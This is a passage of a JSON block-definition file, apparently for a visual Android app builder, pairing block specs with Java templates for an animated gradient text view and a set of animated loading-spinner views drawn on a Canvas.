Point(x, y);\n    }","color":"#CAC319","name":"AnimatedGradientTextViewLibrary","typeName":"","palette":"44","type":" ","spec":"\u003e\u003e\u003e\u003e AnimatedGradientTextView Library % %s.inputOnly \u003c\u003c\u003c\u003c"},{"code":"%s","color":"#CAC319","name":"AnimatedGradientTextViewType","typeName":"AnimatedGradientTextView","palette":"44","type":"p","spec":"AGTV  %s.inputOnly"},{"code":"final AnimatedGradientTextView %1$s \u003d new AnimatedGradientTextView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));","color":"#CAC319","name":"AnimatedGradientTextViewCreate","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%s.inputOnly AnimatedGradientTextView Create %m.activity"},{"code":"%s.setText(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetText","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView setText %s"},{"code":"%s.setTextSize(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetTextSize","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView setTextSize %d"},{"code":"%s.setFonts(\"fonts/%s.ttf\");","color":"#CAC319","name":"AnimatedGradientTextViewSetFonts","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView setFonts %m.font"},{"code":"%s.setColorGradients(new int[]{%s});","color":"#CAC319","name":"AnimatedGradientTextViewSetColorGradients","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView setColorGradients %m.color"},{"code":"%s.setSimultaneousColors(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetSimultaneousColors","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView setSimultaneousColors %d"},{"code":"%s.setAngle(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetAngle","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView  setAngle %d"},{"code":"%s.setSpeed(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetSpeed","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView  setSpeed %d ms"},{"code":"%s.setMaxFPS(%s);","color":"#CAC319","name":"AnimatedGradientTextViewSetMaxFPS","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.AnimatedGradientTextView  setMaxFPS %d"},{"code":"%s.addView(%s);","color":"#CAC319","name":"AnimatedGradientTextViewAddView","typeName":"AnimatedGradientTextView","palette":"44","type":" ","spec":"%m.view addView %m.AnimatedGradientTextView"},{"code":"%s ,%s","color":"#e92467","name":"color with color","typeName":"color","palette":"44","type":"p","spec":"%m.color with %m.color"},{"code":"\t\n\t\t\n}\n\t\t\tpublic class Arc extends GraphicObject {\n\t\t\t\tprivate android.graphics.RectF oval;\n\t\t\t\tprivate float startAngle;\n\t\t\t\tprivate float sweepAngle;\n\t\t\t\tprivate boolean useCenter;\n\n\t\t\t\tpublic void setOval(android.graphics.RectF oval) {\n\t\t\t\t\tthis.oval \u003d oval;\n\t\t\t\t}\n\n\t\t\t\tpublic void setStartAngle(float startAngle) {\n\t\t\t\t\tthis.startAngle \u003d startAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSweepAngle(float sweepAngle) {\n\t\t\t\t\tthis.sweepAngle \u003d sweepAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setUseCenter(boolean useCenter) {\n\t\t\t\t\tthis.useCenter \u003d useCenter;\n\t\t\t\t}\n\n\t\t\t\tpublic float getStartAngle() {\n\t\t\t\t\treturn startAngle;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawArc(oval, startAngle, sweepAngle, useCenter, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Balloon extends LoaderView {\n\t\t\t\t@Override public void initializeObjects() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Circle extends GraphicObject {\n\t\t\t\tprivate PointF center;\n\t\t\t\tprivate float radius;\n\n\t\t\t\tpublic Circle() {\n\t\t\t\t\tcenter \u003d new PointF();\n\t\t\t\t}\n\n\t\t\t\tpublic void setRadius(float radius) {\n\t\t\t\t\tthis.radius \u003d radius;\n\t\t\t\t}\n\n\t\t\t\tpublic void setCenter(float x, float y) {\n\t\t\t\t\tcenter.set(x, y);\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawCircle(center.x, center.y, radius, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class ClassicSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\n\t\t\t\tpublic ClassicSpinner() {\n\t\t\t\t\tcirclesSize \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setAlpha(126);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class FishSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic FishSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 5;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class GraphicObject {\n\t\t\t\tprotected android.graphics.Paint paint;\n\n\t\t\t\tpublic GraphicObject() {\n\t\t\t\t\tpaint \u003d new android.graphics.Paint();\n\t\t\t\t\tpaint.setAntiAlias(true);\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tpaint.setColor(color);\n\t\t\t\t}\n\n\t\t\t\tpublic void setAlpha(int alpha) {\n\t\t\t\t\tpaint.setAlpha(alpha);\n\t\t\t\t}\n\n\t\t\t\tpublic void setWidth(float width) {\n\t\t\t\t\tpaint.setStrokeWidth(width);\n\t\t\t\t}\n\n\t\t\t\tpublic void setStyle(android.graphics.Paint.Style style) {\n\t\t\t\t\tpaint.setStyle(style);\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\t\t\t}\n\n\n\t\t\tpublic interface InvalidateListener {\n\t\t\t\tvoid reDraw();\n\t\t\t}\n\n\t\t\tpublic class InvalidNumberOfPulseException extends Exception {\n\n\t\t\t\t@Override public String getMessage() {\n\t\t\t\t\treturn \"The number of pulse must be between 2 and 6\";\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Line extends GraphicObject {\n\t\t\t\tprivate PointF point1;\n\t\t\t\tprivate PointF point2;\n\n\t\t\t\tpublic void setPoint1(PointF point1) {\n\t\t\t\t\tthis.point1 \u003d point1;\n\t\t\t\t}\n\n\t\t\t\tpublic void setPoint2(PointF point2) {\n\t\t\t\t\tthis.point2 \u003d point2;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint1() {\n\t\t\t\t\treturn point1;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint2() {\n\t\t\t\t\treturn point2;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawLine(point1.x, point1.y, point2.x, point2.y, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class LineSpinner extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLine;\n\n\t\t\t\tpublic LineSpinner() {\n\t\t\t\t\tnumberOfLine \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tint size \u003d Math.min(width, height);\n\t\t\t\t\tfloat lineWidth \u003d size / 10f;\n\t\t\t\t\tlines \u003d new Line[numberOfLine];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setAlpha(126);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(center.x, center.y - size / 2f + lineWidth));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(center.x, lines[i].getPoint1().y + 2 * lineWidth));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tlines[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class PhoneWave extends LoaderView {\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\n\t\t\t\tpublic PhoneWave() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setAlpha(126);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d + r / 3, center.x + d, center.y + d + r / 3));\n\t\t\t\t\t\tarcs[i].setStartAngle(225);\n\t\t\t\t\t\tarcs[i].setSweepAngle(90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tarcs[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Pulse extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLines;\n\t\t\t\tprivate float lineWidth;\n\t\t\t\tprivate float lineDistance;\n\t\t\t\tprivate float[] scaleY;\n\n\t\t\t\tpublic Pulse(int numberOfLines) throws InvalidNumberOfPulseException {\n\t\t\t\t\tif (numberOfLines \u003c 3 || numberOfLines \u003e 5) {\n\t\t\t\t\t\tthrow new InvalidNumberOfPulseException();\n\t\t\t\t\t}\n\n\t\t\t\t\tthis.numberOfLines \u003d numberOfLines;\n\t\t\t\t\tlines \u003d new Line[numberOfLines];\n\t\t\t\t\tscaleY \u003d new float[numberOfLines];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tlineWidth \u003d width / (2 * numberOfLines);\n\t\t\t\t\tlineDistance \u003d lineWidth / 4f;\n\t\t\t\t\tfloat firstX \u003d (width - (lineWidth * numberOfLines + lineDistance * (numberOfLines - 1))) / 2f + lineWidth / 2f;\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(firstX, center.y - height / 4f));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(firstX, center.y + height / 4f));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 1.5f, 1f);\n\t\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\t\tscaleAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tscaleY[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tscaleAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(i * (lineWidth + lineDistance), 0);\n\t\t\t\t\t\tcanvas.scale(1, scaleY[i], lines[i].getPoint1().x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Radar extends LoaderView {\n\t\t\t\tprivate Line line;\n\t\t\t\tprivate float degree;\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tline \u003d new Line();\n\t\t\t\t\tline.setPoint1(center);\n\t\t\t\t\tline.setPoint2(new PointF(0, size / 2f));\n\t\t\t\t\tline.setColor(color);\n\t\t\t\t\tline.setWidth(5);\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator animator \u003d android.animation.ValueAnimator.ofFloat(0, 359);\n\t\t\t\t\tanimator.setDuration(1000);\n\t\t\t\t\tanimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tanimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tdegree \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tanimator.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.rotate(degree, center.x, center.y);\n\t\t\t\t\tline.draw(canvas);\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Sharingan extends LoaderView {\n\t\t\t\tprivate Circle eye;\n\t\t\t\tprivate Circle eyeBound;\n\t\t\t\tprivate Circle[] sharingans;\n\t\t\t\tprivate int numberOfSharingan;\n\t\t\t\tprivate float rotate;\n\t\t\t\tprivate float scale;\n\t\t\t\tprivate float eyeBoundRadius;\n\t\t\t\tprivate float eyeBoundRadiusScale;\n\n\t\t\t\tpublic Sharingan() {\n\t\t\t\t\tnumberOfSharingan \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\teyeBoundRadius \u003d r / 1.5f;\n\n\t\t\t\t\teye \u003d new Circle();\n\t\t\t\t\teye.setCenter(center.x, center.y);\n\t\t\t\t\teye.setColor(color);\n\t\t\t\t\teye.setRadius(r / 4);\n\n\t\t\t\t\teyeBound \u003d new Circle();\n\t\t\t\t\teyeBound.setCenter(center.x, center.y);\n\t\t\t\t\teyeBound.setColor(color);\n\t\t\t\t\teyeBound.setRadius(eyeBoundRadius);\n\t\t\t\t\teyeBound.setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\teyeBound.setWidth(r / 20f);\n\n\t\t\t\t\tsharingans \u003d new Circle[numberOfSharingan];\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tsharingans[i] \u003d new Circle();\n\t\t\t\t\t\tsharingans[i].setCenter(center.x, center.y - eyeBoundRadius);\n\t\t\t\t\t\tsharingans[i].setColor(color);\n\t\t\t\t\t\tsharingans[i].setRadius(r / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator rotateAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\trotateAnimator.setDuration(1500);\n\t\t\t\t\trotateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\trotateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\trotate \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 0.8f, 1f);\n\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tscale \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.AnimatorSet animatorSet \u003d new android.animation.AnimatorSet();\n\t\t\t\t\tanimatorSet.play(rotateAnimator).with(scaleAnimator);\n\t\t\t\t\tanimatorSet.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.scale(scale, scale, center.x, center.y);\n\t\t\t\t\tcanvas.rotate(rotate, center.x, center.y);\n\t\t\t\t\teye.draw(canvas);\n\t\t\t\t\teyeBound.draw(canvas);\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(i * 120, center.x, center.y);\n\t\t\t\t\t\tsharingans[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class TwinFishesSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic TwinFishesSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 10;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle / 2; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\n\t\t\t\t\tfor (int i \u003d numberOfCircle / 2; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, size - circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * (i - 5) / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay((index \u003e\u003d 5 ? index - 5 : index) * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Whirlpool extends LoaderView 